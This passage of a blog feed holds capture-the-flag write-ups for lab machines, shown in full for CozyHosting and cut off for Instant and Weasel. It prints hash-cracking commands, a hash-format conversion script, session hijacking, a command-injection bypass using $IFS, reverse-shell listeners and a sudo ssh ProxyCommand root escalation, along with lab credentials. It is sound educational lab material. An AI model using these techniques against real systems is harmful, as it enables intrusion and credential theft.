2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$ynrgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active we get the pbkdf2 hashes for admin@instant.htb and shirohige@instant.htb. with any luck, these passwords may be reused. however, they are curently not in a hashcat-friendly format. hashcat expects sha256:1000:\u0026lt;base64 encoded salt\u0026gt;:\u0026lt;base64 encoded raw binary value of hash\u0026gt;.\n┌──(kali㉿kali)-[/tmp] └─$ hashcat -m 10900 --hash-info hashcat (v6.2.6) starting in hash-info mode hash info: ========== hash mode #10900 name................: pbkdf2-hmac-sha256 category............: generic kdf slow.hash...........: yes password.len.min....: 0 password.len.max....: 256 salt.type...........: embedded salt.len.min........: 0 salt.len.max........: 256 kernel.type(s)......: pure example.hash.format.: plain example.hash........: sha256:1000:nji3mdm3:vvfavlql9zwjg8bumq6/fb8ftpkigwyk example.pass........: hashcat benchmark.mask......: ?b?b?b?b?b?b?b autodetect.enabled..: yes self.test.enabled...: yes potfile.enabled.....: yes custom.plugin.......: no plaintext.encoding..: ascii, hex our current hashes\u0026rsquo; salts are not base64 encoded, and the hash is in hexadecimal. luckily, it isn\u0026rsquo;t difficult to convert the hashes we have to a crackable format. i have a script that automates the process:\n#!/bin/bash # convert pbkdf2-hmac-sha256 into hashcat-crackable format # usage: ./pbkdf2-hmac-sha256.sh \u0026lt;hash_file\u0026gt; outfile=\u0026#39;./crackable_hashes.txt\u0026#39; tempfile=\u0026#39;./crackable_hashes.tmp\u0026#39; while read -r line; do ifs=\u0026#39;$\u0026#39; read -r head salt hash \u0026lt;\u0026lt;\u0026lt; \u0026#34;$line\u0026#34; b64_salt=$(echo -n \u0026#34;$salt\u0026#34; | base64) b64_hash=$(echo -n \u0026#34;$hash\u0026#34; | xxd -r -p | base64) crackable_hash=\u0026#34;$head:$b64_salt:$b64_hash\u0026#34; echo \u0026#34;$crackable_hash\u0026#34; \u0026gt;\u0026gt; \u0026#34;$outfile\u0026#34; done \u0026lt; \u0026#34;$1\u0026#34; sed \u0026#39;s/\\$/\\:/g\u0026#39; \u0026#34;$outfile\u0026#34; \u0026gt; \u0026#34;$tempfile\u0026#34; mv \u0026#34;$tempfile\u0026#34; \u0026#34;$outfile\u0026#34; ┌──(kali㉿kali)-[/tmp] └─$ hashcat -a 0 -m 10900 crackable_hashes.txt /usr/share/wordlists/rockyou.txt --show sha256:600000:ww5sz2puaw0=:yvqajgruc8bkl5vergjqqf+smvl3ynjpcdiignlfuo0=:estrella ┌──(venv)─(kali㉿kali)-[/tmp] └─$ python3 ~/opt/solarputtycracker/solarputtycracker.py -p estrella /tmp/sessions-backup.dat ____ __ ___ __ __ _____ __ / __/___ / /___ _ ____ / _ \\ __ __ / /_ / /_ __ __ / ___/____ ___ _ ____ / /__ ___ ____ _\\ \\ / _ \\ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __// \u0026#39;_// -_)/ __/ /___/ \\___//_/ \\_,_//_/ /_/ \\_,_/ \\__/ \\__/ \\_, / \\___//_/ \\_,_/ \\__//_/\\_\\ \\__//_/ /___/ trying to decrypt using password: estrella decryption successful using password: estrella [+] done decrypted file is saved in: solarputty_sessions_decrypted.txt ┌──(venv)─(kali㉿kali)-[/tmp] └─$ cat solarputty_sessions_decrypted.txt { \u0026#34;sessions\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;066894ee-635c-4578-86d0-d36d4838115b\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;10.10.11.37\u0026#34;, \u0026#34;port\u0026#34;: 22, \u0026#34;connectiontype\u0026#34;: 1, \u0026#34;sessionname\u0026#34;: \u0026#34;instant\u0026#34;, \u0026#34;authentication\u0026#34;: 0, \u0026#34;credentialsid\u0026#34;: \u0026#34;452ed919-530e-419b-b721-da76cbe8ed04\u0026#34;, \u0026#34;authenticatescript\u0026#34;: \u0026#34;00000000-0000-0000-0000-000000000000\u0026#34;, \u0026#34;lasttimeopen\u0026#34;: \u0026#34;0001-01-01t00:00:00\u0026#34;, \u0026#34;opencounter\u0026#34;: 1, \u0026#34;serialline\u0026#34;: null, \u0026#34;speed\u0026#34;: 0, \u0026#34;color\u0026#34;: \u0026#34;#ff176998\u0026#34;, \u0026#34;telnetconnectionwaitseconds\u0026#34;: 1, \u0026#34;loggingenabled\u0026#34;: false, \u0026#34;remotedirectory\u0026#34;: \u0026#34;\u0026#34; } ], \u0026#34;credentials\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;452ed919-530e-419b-b721-da76cbe8ed04\u0026#34;, \u0026#34;credentialsname\u0026#34;: \u0026#34;instant-root\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;12**24nzc!r0c%q12\u0026#34;, \u0026#34;privatekeypath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;passphrase\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;privatekeycontent\u0026#34;: null } ], \u0026#34;authscript\u0026#34;: [], \u0026#34;groups\u0026#34;: [], \u0026#34;tunnels\u0026#34;: [], \u0026#34;logsfolderdestination\u0026#34;: \u0026#34;c:\\\\programdata\\\\solarwinds\\\\logs\\\\solar-putty\\\\sessionlogs\u0026#34; } shirohige@instant:~$ su root password: root@instant:/home/shirohige# ","title":"Instant"},{"date":"2025-01-25","image":"","imageAlt":"","link":"http://localhost:1313/posts/cozyhosting/","summary":"\u003cp\u003e\u003cimg src=\"/img/cozyhosting/cozyhosting.png\" alt=\"CozyHosting\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eCozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding an exposed user session and exploitating an authenticated\ncommand injection vulnerability. After gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.\u003c/p\u003e","tags":["Broken Access Control","Command Injection","HTB","Linux","Security Misconfiguration","Session Hijacking","Spring Boot","Web Security"],"text":"\ndescription cozyhosting is an easy-rated challenge on hackthebox. the foothold involves finding an exposed user session and exploitating an authenticated command injection vulnerability. after gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.\nrecon starting off with a nmap scan, we find 2 open tcp ports: 22 and 80.\n# nmap 7.94svn scan initiated sun jan 26 14:49:51 2025 as: nmap -p- -a -v -on /tmp/nmap.scan -t4 10.10.11.230 increasing send delay for 10.10.11.230 from 0 to 5 due to 599 out of 1496 dropped probes since last increase. increasing send delay for 10.10.11.230 from 5 to 10 due to 11 out of 16 dropped probes since last increase. warning: 10.10.11.230 giving up on port because retransmission cap hit (6). nmap scan report for cozyhosting.htb (10.10.11.230) host is up (0.041s latency). not shown: 65424 closed tcp ports (reset), 109 filtered tcp ports (no-response) port state service version 22/tcp open ssh openssh 8.9p1 ubuntu 3ubuntu0.3 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ecdsa) |_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ed25519) 80/tcp open http nginx 1.18.0 (ubuntu) | http-methods: |_ supported methods: get head options |_http-favicon: unknown favicon md5: 72a61f8058a9468d57c3017158769b1f |_http-title: cozy hosting - home |_http-server-header: nginx/1.18.0 (ubuntu) no exact os matches for host (if you know what os is running on it, see https://nmap.org/submit/ ). tcp/ip fingerprint: os:scan(v=7.94svn%e=4%d=1/26%ot=22%ct=1%cu=42919%pv=y%ds=2%dc=t%g=y%tm=6796 os:a375%p=x86_64-pc-linux-gnu)seq(sp=104%gcd=1%isr=108%ti=z%ci=z%ii=i%ts=a) os:seq(sp=105%gcd=1%isr=109%ti=z%ci=z%ii=i%ts=a)seq(sp=106%gcd=1%isr=109%ti os:=z%ci=z%ii=i%ts=a)seq(sp=106%gcd=1%isr=10a%ti=z%ci=z%ii=i%ts=a)ops(o1=m5 os:3cst11nw7%o2=m53cst11nw7%o3=m53cnnt11nw7%o4=m53cst11nw7%o5=m53cst11nw7%o os:6=m53cst11)win(w1=fe88%w2=fe88%w3=fe88%w4=fe88%w5=fe88%w6=fe88)ecn(r=y%d os:f=y%t=40%w=faf0%o=m53cnnsnw7%cc=y%q=)t1(r=y%df=y%t=40%s=o%a=s+%f=as%rd=0 os:%q=)t2(r=n)t3(r=n)t4(r=y%df=y%t=40%w=0%s=a%a=z%f=r%o=%rd=0%q=)t5(r=y%df= os:y%t=40%w=0%s=z%a=s+%f=ar%o=%rd=0%q=)t6(r=y%df=y%t=40%w=0%s=a%a=z%f=r%o=% os:rd=0%q=)t7(r=y%df=y%t=40%w=0%s=z%a=s+%f=ar%o=%rd=0%q=)u1(r=y%df=n%t=40%i os:pl=164%un=0%ripl=g%rid=g%ripck=g%ruck=g%rud=g)ie(r=y%dfi=n%t=40%cd=s) uptime guess: 42.330 days (since sun dec 15 07:09:02 2024) network distance: 2 hops tcp sequence prediction: difficulty=262 (good luck!) ip id sequence generation: all zeros service info: os: linux; cpe: cpe:/o:linux:linux_kernel traceroute (using port 587/tcp) hop rtt address 1 40.73 ms 10.10.14.1 2 40.83 ms cozyhosting.htb (10.10.11.230) read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at sun jan 26 15:04:53 2025 -- 1 ip address (1 host up) scanned in 903.07 seconds port 80 reveals a website:\ndirectory busting reveals the /actuator/ subdirectory. actuator is a module for monitoring spring boot websites. interestingly, we get 200 ok responses for actuator, including /actuator/sessions.\n┌──(kali㉿kali)-[~] └─$ dirsearch -u http://cozyhosting.htb --exclude-sizes=0b /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: deprecationwarning: pkg_resources is deprecated as an api. see https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import distributionnotfound, versionconflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) extensions: php, aspx, jsp, html, js | http method: get | threads: 25 | wordlist size: 11460 target: http://cozyhosting.htb/ [16:52:15] starting: [16:52:43] 400 - 435b - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd [16:52:46] 400 - 435b - /a%5c.aspx [16:52:50] 200 - 634b - /actuator [16:52:51] 200 - 124kb - /actuator/beans [16:52:51] 200 - 5kb - /actuator/env [16:52:51] 200 - 15b - /actuator/health [16:52:51] 200 - 10kb - /actuator/mappings [16:52:51] 200 - 398b - /actuator/sessions [16:52:54] 401 - 97b - /admin [16:53:54] 500 - 73b - /error [16:54:26] 200 - 4kb - /login task completed visiting /actuator/sessions reveals a user session for kanderson.\nfoothold we can take over kanderson\u0026rsquo;s session by adding his jsessionid cookie to our browser and refreshing the page.\nif not automatically redirected to http://cozyhosting.htb/admin, heading there should now reveal the admin dashboard.\nat the bottom of the page, there is a feature called \u0026ldquo;cozy scanner\u0026rdquo; for automatic patch updates.\ntasks submitted to cozy scanner get passed to the /executessh endpoint. some basic testing reveals that a single colon in the username parameter causes a syntax error. it\u0026rsquo;s also revealed that the server is passing user input directly into a shell command as evidenced by /bin/bash -c.\nto confirm if we have full command execution, i sent a payload to ping my kali machine. however, the server rejects it because it contains whitespaces.\nfortunately, we can use the $ifs variable as an alternative as it represents a whitespace by default.\n┌──(kali㉿kali)-[~] └─$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type raw (raw ip), snapshot length 262144 bytes 17:15:35.692325 ip cozyhosting.htb \u0026gt; 10.10.14.60: icmp echo request, id 4, seq 1, length 64 17:15:36.741961 ip cozyhosting.htb \u0026gt; 10.10.14.60: icmp echo request, id 4, seq 2, length 64 with command injection confirmed, we can now send a payload and get a reverse shell.\n┌──(kali㉿kali)-[~] └─$ nc -nvlp 21 listening on [any] 21 ... connect to [10.10.14.60] from (unknown) [10.10.11.230] 35240 whoami app privilege escalation after stabilizing the shell, i started enumeration. there is a cloudhosting-0.0.1.jar file in the directory we land in. we can transfer this file to our local machine for further analysis.\napp@cozyhosting:/app$ ls -al total 58856 drwxr-xr-x 2 root root 4096 aug 14 2023 . drwxr-xr-x 19 root root 4096 aug 14 2023 .. -rw-r--r-- 1 root root 60259688 aug 11 2023 cloudhosting-0.0.1.jar app@cozyhosting:/app$ python3 -m http.server 8000 serving http on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ┌──(kali㉿kali)-[/tmp] └─$ wget http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar --2025-01-27 11:11:47-- http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar resolving cozyhosting.htb (cozyhosting.htb)... 10.10.11.230 connecting to cozyhosting.htb (cozyhosting.htb)|10.10.11.230|:8000... connected. http request sent, awaiting response... 200 ok length: 60259688 (57m) [application/java-archive] saving to: ‘cloudhosting-0.0.1.jar’ cloudhosting-0.0.1.jar 100%[================================================================\u0026gt;] 57.47m 910kb/s in 60s 2025-01-27 11:12:47 (986 kb/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688] and to extract\u0026hellip;\n┌──(kali㉿kali)-[/tmp/jar] └─$ jar xf cloudhosting-0.0.1.jar picked up _java_options: -dawt.usesystemaafontsettings=on -dswing.aatext=true now we can enumerate the files for credentials. spring.datasource.password in boot-inf/classes/application.properties seems worth digging into.\n┌──(kali㉿kali)-[/tmp/cozy] └─$ grep -ri passw grep: cloudhosting-0.0.1.jar: binary file matches grep: boot-inf/classes/htb/cloudhosting/database/cozyuserdetailsservice.class: binary file matches grep: boot-inf/classes/htb/cloudhosting/database/cozyuser.class: binary file matches grep: boot-inf/classes/htb/cloudhosting/secutiry/securityconfig.class: binary file matches grep: boot-inf/classes/htb/cloudhosting/scheduled/fakeuser.class: binary file matches boot-inf/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: \u0026#34;\\eecf\u0026#34;; } boot-inf/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: \u0026#34;\\eed0\u0026#34;; } boot-inf/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: \u0026#34;\\eecf\u0026#34;; } boot-inf/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: \u0026#34;\\eed0\u0026#34;; } boot-inf/classes/static/assets/vendor/remixicon/remixicon.svg: \u0026lt;glyph glyph-name=\u0026#34;lock-password-fill\u0026#34; boot-inf/classes/static/assets/vendor/remixicon/remixicon.svg: \u0026lt;glyph glyph-name=\u0026#34;lock-password-line\u0026#34; grep: boot-inf/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches boot-inf/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:\u0026lt;/symbol\u0026gt;\u0026lt;symbol viewbox=\u0026#34;0 0 24 24\u0026#34; id=\u0026#34;ri-lock-password-fill\u0026#34;\u0026gt; boot-inf/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:\u0026lt;/symbol\u0026gt;\u0026lt;symbol viewbox=\u0026#34;0 0 24 24\u0026#34; id=\u0026#34;ri-lock-password-line\u0026#34;\u0026gt; grep: boot-inf/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches boot-inf/classes/templates/login.html: \u0026lt;label for=\u0026#34;yourpassword\u0026#34; class=\u0026#34;form-label\u0026#34;\u0026gt;password\u0026lt;/label\u0026gt; boot-inf/classes/templates/login.html: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;yourpassword\u0026#34; boot-inf/classes/templates/login.html: \u0026lt;div class=\u0026#34;invalid-feedback\u0026#34;\u0026gt;please enter your password!\u0026lt;/div\u0026gt; boot-inf/classes/templates/login.html: \u0026lt;p th:if=\u0026#34;${param.error}\u0026#34; class=\u0026#34;text-center small\u0026#34;\u0026gt;invalid username or password\u0026lt;/p\u0026gt; boot-inf/classes/application.properties:spring.datasource.password=vg\u0026amp;nvzaq7xxr grep: boot-inf/lib/spring-security-config-6.0.1.jar: binary file matches grep: boot-inf/lib/spring-security-web-6.0.1.jar: binary file matches grep: boot-inf/lib/thymeleaf-spring6-3.1.1.release.jar: binary file matches grep: boot-inf/lib/tomcat-embed-core-10.1.5.jar: binary file matches grep: boot-inf/lib/spring-webmvc-6.0.4.jar: binary file matches grep: boot-inf/lib/postgresql-42.5.1.jar: binary file matches grep: boot-inf/lib/spring-security-core-6.0.1.jar: binary file matches grep: boot-inf/lib/spring-security-crypto-6.0.1.jar: binary file matches we find postgresql credentials.\n┌──(kali㉿kali)-[/tmp/cozy] └─$ cat boot-inf/classes/application.properties server.address=127.0.0.1 server.servlet.session.timeout=5m management.endpoints.web.exposure.include=health,beans,env,sessions,mappings management.endpoint.sessions.enabled = true spring.datasource.driver-class-name=org.postgresql.driver spring.jpa.database-platform=org.hibernate.dialect.postgresqldialect spring.jpa.hibernate.ddl-auto=none spring.jpa.database=postgresql spring.datasource.platform=postgres spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=vg\u0026amp;nvzaq7xxr querying systemctl reveals that postgresql is indeed running on the cozyhosting server. we can therefore authenticate with the credentials we found.\napp@cozyhosting:/tmp$ systemctl status postgresql ● postgresql.service - postgresql rdbms loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor pr\u0026gt; active: active (exited) since sat 2025-01-25 22:33:04 utc; 2h 5min ago process: 1129 execstart=/bin/true (code=exited, status=0/success) main pid: 1129 (code=exited, status=0/success) cpu: 804us authentication:\napp@cozyhosting:/tmp$ psql -u postgres -h 127.0.0.1 password for user postgres: psql (14.9 (ubuntu 14.9-0ubuntu0.22.04.1)) ssl connection (protocol: tlsv1.3, cipher: tls_aes_256_gcm_sha384, bits: 256, compression: off) type \u0026#34;help\u0026#34; for help. postgres=# further enumeration reveals a users table from the cozyhosting database, which includes password hashes for the kanderson and admin users.\npostgres-# \\l postgres-# \\c cozyhosting cozyhosting=# \\dt cozyhosting=# select * from users; cozyhosting=# kanderson | $2a$10$e/vcd9ecflmpudwelseiv.cvk6qjxjwlwxpij1nvnv3mm6eh58zim | user admin | $2a$10$spkydhlb0foat7n3x72wtus0yr8uqqbnnpipjub2mzib3h9kvo8dm | admin i was only able to crack the password hash for admin, which doesn\u0026rsquo;t provide much for directly, but we can test for password reuse.\n┌──(kali㉿kali)-[/tmp] └─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show $2a$10$spkydhlb0foat7n3x72wtus0yr8uqqbnnpipjub2mzib3h9kvo8dm:manchesterunited looking at system users, root, josh, and postgres seem worth looking into.\napp@cozyhosting:/app$ cat /etc/passwd | grep -v nologin | grep -v false root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync app:x:1001:1001::/home/app:/bin/sh postgres:x:114:120:postgresql administrator,,,:/var/lib/postgresql:/bin/bash josh:x:1003:1003::/home/josh:/usr/bin/bash using manchesterunited as josh\u0026rsquo;s password is successful.\napp@cozyhosting:/tmp$ su josh password: josh@cozyhosting:/tmp$ checking sudo privileges for josh shows that he can run ssh as root.\njosh@cozyhosting:/tmp$ sudo -l [sudo] password for josh: matching defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty user josh may run the following commands on localhost: (root) /usr/bin/ssh * we can exploit this by using ssh\u0026rsquo;s proxycommand feature to execute commands. we will need to direct both stdin and stdout to stderr in order to see our commands and responses within our current session. payload courtesy of gtfobins.\njosh@cozyhosting:/tmp$ sudo ssh -o proxycommand=\u0026#39;;bash 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x root@cozyhosting:/tmp# whoami root and with that, cozyhosting is owned.\n","title":"CozyHosting"},{"date":"2024-12-23","image":"","imageAlt":"","link":"http://localhost:1313/posts/weasel/","summary":"\u003cp\u003e\u003cimg src=\"/img/weasel/weasel.png\" alt=\"Weasel\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eWeasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.\u003c/p\u003e","tags":["AlwaysInstallElevated","Autologon","Linux","Null Session","THM","Windows","WSL Escape"],"text":"\ndescription weasel is a medium difficulty challenge on tryhackme. we get a foothold on wsl through jupyter notebook and find a ssh key that allows us to ssh into the windows host. finally, we escalate privileges by exploiting alwaysinstallelevated with a malicious windows installer file.\nrecon first thing\u0026rsquo;s first. let\u0026rsquo;s start with a nmap scan.\n# nmap 7.94svn scan initiated sun dec 22 23:42:51 2024 as: nmap -p- -a -v -on /tmp/nmap.scan -t4 10.10.34.193 increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase. increasing send delay for 10.10.34.193 from 5 to 10 due to 11 out of 21 dropped probes since last increase. nmap scan report for 10.10.34.193 host is up (0.26s latency). not shown: 65520 closed tcp ports (reset) port state service version 22/tcp open ssh openssh for_windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (rsa) | 256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ecdsa) |_ 256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ed25519) 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server microsoft terminal services | rdp-ntlm-info: | target_name: dev-datasci-jup | netbios_domain_name: dev-datasci-jup | netbios_computer_name: dev-datasci-jup | dns_domain_name: dev-datasci-jup | dns_computer_name: dev-datasci-jup | product_version: 10.0.17763 |_ system_time: 2024-12-23t06:11:34+00:00 |_ssl-date: 2024-12-23t06:11:48+00:00; 0s from scanner time. | ssl-cert: subject: commonname=dev-datasci-jup | issuer: commonname=dev-datasci-jup | public key type: rsa | public key bits: 2048 | signature algorithm: sha256withrsaencryption | not valid before: 2024-12-22t03:04:54 | not valid after: 2025-06-23t03:04:54 | md5: cc8d:e018:37dd:d6b2:b0b9:556e:9c44:156b |_sha-1: 159e:345a:b60d:485b:e255:25fd:6bd2:7cc0:1eaa:67eb 5985/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: not found |_http-server-header: microsoft-httpapi/2.0 8888/tcp open http tornado httpd 6.0.3 | http-title: jupyter notebook |_requested resource was /login?next=%2ftree%3f | http-methods: |_ supported methods: get post | http-robots.txt: 1 disallowed entry |_/ |_http-favicon: unknown favicon md5: 97c6417ed01bdc0ae3ef32ae4894fd03 |_http-server-header: tornadoserver/6.0.3 47001/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-server-header: microsoft-httpapi/2.0 |_http-title: not found 49664/tcp open msrpc microsoft windows rpc 49665/tcp open msrpc microsoft windows rpc 49667/tcp open msrpc microsoft windows rpc 49668/tcp open msrpc microsoft windows rpc 49669/tcp open msrpc microsoft windows rpc 49670/tcp open msrpc microsoft windows rpc 49672/tcp open msrpc microsoft windows rpc aggressive os guesses: microsoft windows server 2019 (95%), microsoft windows vista sp1 (92%), microsoft windows longhorn (91%), microsoft windows server 2012 (91%), microsoft windows 10 1709 - 1909 (91%), microsoft windows 7, windows server 2012, or windows 8.1 update 1 (91%), microsoft windows 10 1703 (90%), microsoft windows 8 (90%), microsoft windows server 2012 r2 (89%), microsoft windows server 2012 r2 update 1 (89%) no exact os matches for host (test conditions non-ideal). network distance: 4 hops tcp sequence prediction: difficulty=256 (good luck!) ip id sequence generation: randomized service info: os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-time: | date: 2024-12-23t06:11:35 |_ start_date: n/a | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required traceroute (using port 554/tcp) hop rtt address 1 137.61 ms 10.13.0.1 2 ... 3 4 263.53 ms 10.10.34.193 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at mon dec 23 00:11:48 2024 -- 1 ip address (1 host up) scanned in 1737.39 seconds we some interesting ports open. looking at port 8888, there is a notebook server.\nunfortunately, we don\u0026rsquo;t have a token or password. next, i took a look at the smb shares on port 445 and noticed that guest access was allowed.\n┌──(kali㉿kali)-[~] └─$ nxc smb 10.10.34.193 -u guest -p \u0026#39;\u0026#39; --shares smb 10.10.34.193 445 dev-datasci-jup [*] windows 10 / server 2019 build 17763 x64 (name:dev-datasci-jup) (domain:dev-datasci-jup) (signing:false) (smbv1:false) smb 10.10.34.193 445 dev-datasci-jup [+] dev-datasci-jup\\guest: smb 10.10.34.193 445 dev-datasci-jup [*] enumerated shares smb 10.10.34.193 445 dev-datasci-jup share permissions remark smb 10.10.34.193 445 dev-datasci-jup ----- ----------- ------ smb 10.10.34.193 445 dev-datasci-jup admin$ remote admin smb 10.10.34.193 445 dev-datasci-jup c$ default share smb 10.10.34.193 445 dev-datasci-jup datasci-team read,write smb 10.10.34.193 445 dev-datasci-jup ipc$ read remote ipc we have read and write permissions on the nonstandard datasci-team share. taking\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.34.193/datasci-team -u guest --password=\u0026#39;\u0026#39; try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 sun dec 22 21:13:41 2024 .. d 0 sun dec 22 21:13:41 2024 .ipynb_checkpoints da 0 thu aug 25 10:26:47 2022 long-tailed_weasel_range_-_cwhr_m157_[ds1940].csv a 146 thu aug 25 10:26:46 2022 misc da 0 thu aug 25 10:26:47 2022 mpe63-3_745-757.pdf a 414804 thu aug 25 10:26:46 2022 papers da 0 thu aug 25 10:26:47 2022 pics da 0 thu aug 25 10:26:47 2022 requirements.txt a 12 thu aug 25 10:26:46 2022 weasel.ipynb a 4308 thu aug 25 10:26:46 2022 weasel.txt a 51 thu aug 25 10:26:46 2022 15587583 blocks of size 4096. 8928179 blocks available smb: \\\u0026gt; i transferred everything to my local machine for easier enumeration.\nsmb: \\\u0026gt; lcd /tmp/smb smb: \\\u0026gt; recurse on smb: \\\u0026gt; prompt off smb: \\\u0026gt; mget * getting file \\long-tailed_weasel_range_-_cwhr_m157_[ds1940].csv of size 146 as long-tailed_weasel_range_-_cwhr_m157_[ds1940].csv (0.1 kilobytes/sec) (average 0.1 kilobytes/sec) getting file \\mpe63-3_745-757.pdf of size 414804 as mpe63-3_745-757.pdf (109.2 kilobytes/sec) (average 68.5 kilobytes/sec) getting file \\requirements.txt of size 12 as requirements.txt (0.0 kilobytes/sec) (average 58.5 kilobytes/sec) getting file \\weasel.ipynb of size 4308 as weasel.ipynb (4.7 kilobytes/sec) (average 52.4 kilobytes/sec) getting file \\weasel.txt of size 51 as weasel.txt (0.1 kilobytes/sec) (average 47.1 kilobytes/sec) getting file \\.ipynb_checkpoints\\requirements-checkpoint.txt of size 12 as .ipynb_checkpoints/requirements-checkpoint.txt (0.0 kilobytes/sec) (average 42.6 kilobytes/sec) getting file \\.ipynb_checkpoints\\weasel-checkpoint.ipynb of size 5972 as .ipynb_checkpoints/weasel-checkpoint.ipynb (6.3 kilobytes/sec) (average 39.4 kilobytes/sec) getting file \\misc\\jupyter-token.txt of size 52 as misc/jupyter-token.txt (0.1 kilobytes/sec) (average 36.3 kilobytes/sec) getting file \\papers\\bi002_2613_cz-40-2_acta-t34-nr25-347-359_o.pdf of size 3491735 as papers/bi002_2613_cz-40-2_acta-t34-nr25-347-359_o.pdf (177.8 kilobytes/sec) (average 124.9 kilobytes/sec) getting file \\papers\\dillard_living_like_weasels.pdf of size 45473 as papers/dillard_living_like_weasels.pdf (34.7 kilobytes/sec) (average 121.3 kilobytes/sec) getting file \\pics\\57475-weasel-facts.html of size 301025 as pics/57475-weasel-facts.html (110.1 kilobytes/sec) (average 120.4 kilobytes/sec) getting file \\pics\\long-tailed-weasel of size 250269 as pics/long-tailed-weasel (72.2 kilobytes/sec) (average 116.1 kilobytes/sec) getting file \\pics\\weasel of size 229746 as pics/weasel (81.6 kilobytes/sec) (average 113.8 kilobytes/sec) a lot of stuff about weasels, but also the file jupyter-token.txt in misc.\n┌──(kali㉿kali)-[/tmp/smb] └─$ ls -al misc total 4 drwxrwxr-x 2 kali kali 60 dec 22 21:15 . drwxrwxr-x 6 kali kali 220 dec 22 21:15 .. -rw-r--r-- 1 kali kali 52 dec 22 21:15 jupyter-token.txt ┌──(kali㉿kali)-[/tmp/smb] └─$ cat misc/jupyter-token.txt 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a foothold we are able to use this token to login to jupyter notebook on port 8888, where we can edit weasel.ipynb or create a new jupyter notebook file to get a shell.\ni tried to use python to execute powershell and get a reverse shell that way. i wasn\u0026rsquo;t able to get a connection, and after some testing realized that windows-specific features like powershell simply weren\u0026rsquo;t being executed correctly. on the other hand, linux commands were working perfectly fine. given that our nmap scan revealed many details that our target is a windows machine (e.g. rdp and microsoft rpc). it\u0026rsquo;s fairly safe to say that we are up against wsl.\nso i got a shell using bash.\n┌──(kali㉿kali)-[/tmp/smb] └─$ nc -nvlp 21 listening on [any] 21 ... connect to [10.13.48.55] from (unknown) [10.10.34.193] 50376 bash: cannot set terminal process group (10): invalid argument bash: no job control in this shell (base) dev-datasci@dev-datasci-jup:~/datasci-team$ breaking out of wsl checking sudo permissions is something i always do early one since 